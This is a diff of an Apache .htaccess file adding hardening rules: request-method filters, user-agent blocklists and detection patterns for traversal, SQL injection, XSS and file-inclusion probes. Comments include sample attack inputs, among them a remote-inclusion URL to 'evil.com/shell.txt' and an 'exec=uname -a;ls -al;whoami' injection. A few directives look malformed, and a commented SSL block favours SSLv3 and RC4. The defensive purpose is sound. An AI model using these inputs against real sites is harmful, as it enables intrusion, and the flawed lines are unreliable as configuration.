@@ -1,30 +1,215 @@
-# Apache configuration file (see httpd.apache.org/docs/2.2/mod/quickreference.html)
+# TURN OFF YOUR SERVER SIGNATURE
+ServerSignature Off
 
-# disable directory listing
+# DO NOT SHOW DIRECTORY LISTING
 Options -Indexes
-AddDefaultCharset utf-8
-IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*
 
-<Limit PUT DELETE>
-order allow,deny
-deny from all
-</Limit>
+# DIRECTORY INDEX FORCE INDEX.PHP
+DirectoryIndex index.php index.html /index.php
 
-# deny all .htaccess, .DS_Store htaccess and ._* (resource fork) files
-<Files ~ "^\.([Hh][Tt]|[Dd][Ss]_[Ss]|[_])">
- Order allow,deny
- Deny from all
- Satisfy All
+# DENY ACCESS TO PROTECTED SERVER FILES AND FOLDERS
+# Files and folders starting with a dot: .htaccess, .htpasswd, .errordocs, .logs
+RedirectMatch 403 \.(htaccess|htpasswd|errordocs|logs)$
+
+# REQUEST METHODS FILTERED
+# This filter is for blocking junk bots and spam bots from making a HEAD request, but may also block some
+# HEAD request from bots that you want to allow in certains cases. This is not a security filter and is just
+# a nuisance filter. This filter will not block any important bots like the google bot. If you want to allow
+# all bots to make a HEAD request then remove HEAD from the Request Method filter.
+# The TRACE, DELETE, TRACK and DEBUG request methods should never be allowed against your website.
+RewriteEngine On
+RewriteCond %{REQUEST_METHOD} ^(HEAD|TRACE|DELETE|TRACK|DEBUG) [NC]
+RewriteRule ^(.*)$ - [F,L]
+
+# QUERY STRING EXPLOITS
+# The libwww-perl User Agent is forbidden - Many bad bots use libwww-perl modules, but some good bots use it too.
+# Good sites such as W3C use it for their W3C-LinkChecker. 
+# Add or remove user agents temporarily or permanently from the first User Agent filter below.
+# If you want a list of bad bots / User Agents to block then scroll to the end of this file.
+RewriteCond %{HTTP_USER_AGENT} (havij|libwww-perl|wget|python|nikto|curl|scan|java|winhttp|clshttp|loader) [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} (%0A|%0D|%27|%3C|%3E|%00) [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} (;|<|>|'|"|\)|\(|%0A|%0D|%22|%27|%28|%3C|%3E|%00).*(libwww-perl|wget|python|nikto|curl|scan|java|winhttp|HTTrack|clshttp|archiver|loader|email|harvest|extract|grab|miner) [NC,OR]
+RewriteCond %{THE_REQUEST} \?\ HTTP/ [NC,OR]
+RewriteCond %{THE_REQUEST} \/\*\ HTTP/ [NC,OR]
+RewriteCond %{THE_REQUEST} etc/passwd [NC,OR]
+RewriteCond %{THE_REQUEST} cgi-bin [NC,OR]
+RewriteCond %{THE_REQUEST} (%0A|%0D|\\r|\\n) [NC,OR]
+RewriteCond %{REQUEST_URI} owssvr\.dll [NC,OR]
+RewriteCond %{HTTP_REFERER} (%0A|%0D|%27|%3C|%3E|%00) [NC,OR]
+RewriteCond %{HTTP_REFERER} \.opendirviewer\. [NC,OR]
+RewriteCond %{HTTP_REFERER} users\.skynet\.be.* [NC,OR]
+RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=http:// [NC,OR]
+RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=(\.\.//?)+ [NC,OR]
+RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=/([a-z0-9_.]//?)+ [NC,OR]
+RewriteCond %{QUERY_STRING} \=PHP[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12} [NC,OR]
+RewriteCond %{QUERY_STRING} (\.\./|%2e%2e%2f|%2e%2e/|\.\.%2f|%2e\.%2f|%2e\./|\.%2e%2f|\.%2e/) [NC,OR]
+RewriteCond %{QUERY_STRING} ftp\: [NC,OR]
+RewriteCond %{QUERY_STRING} http\: [NC,OR] 
+RewriteCond %{QUERY_STRING} https\: [NC,OR]
+RewriteCond %{QUERY_STRING} \=\|w\| [NC,OR]
+RewriteCond %{QUERY_STRING} ^(.*)/self/(.*)$ [NC,OR]
+RewriteCond %{QUERY_STRING} ^(.*)cPath=http://(.*)$ [NC,OR]
+RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|%3C)([^s]*s)+cript.*(>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (\<|%3C).*embed.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|%3C)([^e]*e)+mbed.*(>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (\<|%3C).*object.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|%3C)([^o]*o)+bject.*(>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (\<|%3C).*iframe.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|%3C)([^i]*i)+frame.*(>|%3E) [NC,OR] 
+RewriteCond %{QUERY_STRING} base64_encode.*\(.*\) [NC,OR]
+RewriteCond %{QUERY_STRING} base64_(en|de)code[^(]*\([^)]*\) [NC,OR]
+RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
+RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2}) [OR]
+RewriteCond %{QUERY_STRING} ^.*(\(|\)|<|>|%3c|%3e).* [NC,OR]
+RewriteCond %{QUERY_STRING} ^.*(\x00|\x04|\x08|\x0d|\x1b|\x20|\x3c|\x3e|\x7f).* [NC,OR]
+RewriteCond %{QUERY_STRING} (NULL|OUTFILE|LOAD_FILE) [OR]
+RewriteCond %{QUERY_STRING} (\.{1,}/)+(motd|etc|bin) [NC,OR]
+RewriteCond %{QUERY_STRING} (localhost|loopback|127\.0\.0\.1) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|>|'|%0A|%0D|%27|%3C|%3E|%00) [NC,OR]
+RewriteCond %{QUERY_STRING} concat[^\(]*\( [NC,OR]
+RewriteCond %{QUERY_STRING} union([^s]*s)+elect [NC,OR]
+RewriteCond %{QUERY_STRING} union([^a]*a)+ll([^s]*s)+elect [NC,OR]
+RewriteCond %{QUERY_STRING} \-[sdcr].*(allow_url_include|allow_url_fopen|safe_mode|disable_functions|auto_prepend_file) [NC,OR]
+RewriteCond %{QUERY_STRING} (;|<|>|'|"|\)|%0A|%0D|%22|%27|%3C|%3E|%00).*(/\*|union|select|insert|drop|delete|update|cast|create|char|convert|alter|declare|order|script|set|md5|benchmark|encode) [NC,OR]
+RewriteCond %{QUERY_STRING} (sp_executesql) [NC]
+RewriteRule ^(.*)$ - [F,L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+
+# DENY BROWSER ACCESS TO THESE FILES
+<FilesMatch "^(config\.php|php\.ini|php5\.ini|readme\.html|bb-config\.php)">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+# deny all .htaccess, .DS_Store $h and ._* (resource fork) files 
+<Files ~ \"^\\.([Hh][Tt]|[Dd][Ss]_[Ss]|[_])\">
+Order allow,deny
+Deny from all
+Satisfy All
 </Files>
 
-# deny access to all .log and .comment files
-<Files ~ "^.*\.([Ll][Oo][Gg]|[cC][oO][mM][mM][eE][nN][tT])">
- Order allow,deny
- Deny from all
- Satisfy All
+# deny access to all .log and .comment files 
+<Files ~ \"^.*\\.([Ll][Oo][Gg]|[cC][oO][mM][mM][eE][nN][tT])\">
+Order allow,deny
+Deny from all
+Satisfy All
 </Files>
 
-<Files 403.shtml>
-order allow,deny
-allow from all
-</Files>
+# Sample Hardened Apache Mod_Rewrite Security Rule 
+# http://www.sectechno.com/2011/11/14/using-mod_rewrite-to-harden-apache/? 
+# Ref: http://httpd.apache.org/docs/2.0/mod/mod_rewrite.html#rewritecond 
+# Some sections were provided by Aung Khant, http://yehg.net # 
+# NC = \'nocase|NC\' (no case-sensitive) 
+# OR = \'ornext|OR\' (or next condition) 
+# L = last rule 
+
+# Force High level of SSL encryption
+#<IfModule ssl_module>
+#SSLRandomSeed startup builtin
+#SSLRandomSeed connect builtin
+#SSLOptions +StrictRequire
+#SSLProtocol ALL +SSLv3 +TLSv1
+#SSLCipherSuite ALL:!aNULL:!ADH:!eNULL:!LOW:!EXP:RC4+RSA:+HIGH:+MEDIUM
+#</IfModule>
+
+#This section reads a blacklist text file of referrers and block access
+#The text file entries are one per line in the format: http://website_url_referral_that_appears_in_access_log -
+#The hyphen at the end is important as it separates entries and denotes the end of the line
+
+#RewriteMap deflector txt:/etc/httpd/conf/blacklist.txt
+#RewriteCond %{HTTP_REFERER} !=""
+#RewriteCond ${deflector:%{HTTP_REFERER}} ^-$
+#RewriteRule ^.* %{HTTP_REFERER} [R,L]
+
+#RewriteCond %{HTTP_REFERER} !=""
+#RewriteCond ${deflector:%{HTTP_REFERER}|NOT-FOUND} !=NOT-FOUND
+#RewriteRule ^.* ${deflector:%{HTTP_REFERER}} [R,L]
+
+#This option turns off trace track methods
+#RewriteCond %{REQUEST_METHOD} ^(TRACE|TRACK)
+#RewriteRule .* – [F]
+#TraceEnable off
+
+# Allow only GET and POST verbs
+# ‘Coz most vul scanners use HEAD for hunting buggy files existence
+RewriteCond %{REQUEST_METHOD} !^(GET|POST)$ [NC,OR]
+
+# Ban Non-GUI Browsers
+RewriteCond %{HTTP_USER_AGENT} ^.*(lynx|wget).* [NC,OR]
+
+# Ban Typical Vulnerability Scanners and others
+RewriteCond %{HTTP_USER_AGENT} ^()$ [NC,OR] # void of UserAgent
+
+# Known Web vulnerabilty Scanners
+RewriteCond %{HTTP_USER_AGENT} ^.*(syhunt|sqlmap|WhatWeb|Netsparker|w3af|Nstalker|acunetix|qualys|nikto|wikto|pikto|pykto).* [NC,OR]
+
+# Random Underground Web Exploit Scanners
+RewriteCond %{HTTP_USER_AGENT} ^.*(javascript:alert|0ds0a|ZeW|SlimBrowser|drone|DataCha|SBIder|Shelob|MobileRunner|MicrosoftsOffice|Plesk|Itah|Mosill|InternetsExplorers4.01|al_viewer|NetSeer|MSFrontPage|Yandex|webcollage|lwp-trivial|Isidorus|core-project|<script>|Toatasdragosteasmeaspentrusdiavola|StackRambler|Firebat|Y!J-SRD|ZmEu|libwww|perl|java|curl|ruby|python|scan|kiss|ass|Morfeus|0wn|hack|h4x|h4x0r).* [NC,OR]
+
+# Denial-of-Service Tool
+RewriteCond %{HTTP_USER_AGENT} ^.*(ApacheBench).* [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ^.*(WWW-Mechanize|revolt|Crawl|Mail.Ru|Walker|sbide|findlinks|spide|AcesExplorer|winhttp|HTTrack|clshttp|archiver|loader|email|harvest|extract|grab|miner).* [NC,OR]
+
+# Disable access to cgi-bins if not used
+RewriteCond %{REQUEST_URI} ^/(cgi.cgi|webcgi|cgi-914|cgi-915|bin|cgi|mpcgi|cgi-bin|ows-bin|cgi-sys|cgi-local|htbin|cgibin|cgis|scripts|cgi-win|fcgi-bin|cgi-exe|cgi-home|cgi-perl|scgi-bin)/ [NC,OR]
+
+# Block out common attack strings
+# Additional filtering can be put into
+# HTTP_USER_AGENT, HTTP_REFERER, HTTP_COOKIE,HTTP_FORWARDED,HTTP_ACCEPT
+
+# Directory Traversal, Null Byte Injection, HTTP Response Splitting
+RewriteCond %{QUERY_STRING} ^.*(../|..%2f|..%5C|..%252F|..%255C|..%u2215|%u002e%u002e%u2215|%252e%252e%252f|%00|\x00|\u00|%5C00|%09|%0D%0A) [NC,OR]
+
+# SQL Injection Probing
+RewriteCond %{QUERY_STRING} ^.*(@@version|CHR(|CHAR(|UNION%20SELECT|/select/|/union/|/insert/|/update/|/delete/).* [NC,OR]
+RewriteCond %{QUERY_STRING} ^.*(or|and)%20([0-9]=[0-9]).* [NC,OR]
+
+# Remote/Local File Inclusion
+# RFI: yoursite.com/?pg=http://evil.com/shell.txt?
+# LFI: yoursite.com/?pg=/logs/access_log?
+RewriteCond %{QUERY_STRING} .*(=https|=http|=ftp)(://|%3a%2f%2f).*?$ [NC,OR]
+RewriteCond %{QUERY_STRING} (/access_log|boot.ini|/etc/passwd|%2Fetc%2Fpasswd|c:\boot.ini|c%3A\boot.ini|c:/boot.ini|c:%2Fboot.ini|c%3A%2Fboot.ini|c:boot.ini|c%3Aboot.ini).* [NC,OR]
+
+# PHP Version Probing
+RewriteCond %{QUERY_STRING} ^(=PHP).* [NC,OR]
+
+# XSS Probing
+RewriteCond %{QUERY_STRING} ^.*(<|%3C).*script.*(>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} ^.*(/XSS/).* [NC,OR]
+
+# PHP GLOBALS Overriding
+RewriteCond %{QUERY_STRING} GLOBALS(=|[|%[0-9A-Z]{0,2}) [NC,OR]
+
+# PHP REQUEST variable Overriding
+RewriteCond %{QUERY_STRING} _REQUEST(=|[|%[0-9A-Z]{0,2}) [NC,OR]
+
+# PHP Command Injection Probing
+# vuln.php?exec=uname -a;ls -al;whoami
+RewriteCond %{QUERY_STRING} ^.*(=|;)(uname%20-|ls%20-|whoami).*
+
+# Deny access – Select one of the RewriteRules below:
+#
+# You can be nice and send the denial to an error page
+RewriteRule ^(.*)$ /403.html [F,L]
+# or
+# Send them back to their own address
+# RewriteRule ^(.*)$ http://%{REMOTE_ADDR} [R=301,L]
+
+# XML-RPC DDoS PROTECTION
+# You can whitelist your IP address if you use A Weblog Client
+# or want to whitelist your IP address for any other reasons.
+# Example: uncomment #Allow from x.x.x. by deleting the # sign and
+# replace the x's with your actual IP address. Allow from 99.88.77.
+# Note: It is recommended that you use 3 octets x.x.x. of your IP address
+# instead of 4 octets x.x.x.x of your IP address.
+
+<FilesMatch "^(xmlrpc\.php)">
+Order Deny,Allow
+Deny from all
+#Allow from x.x.x.
+</FilesMatch>
+
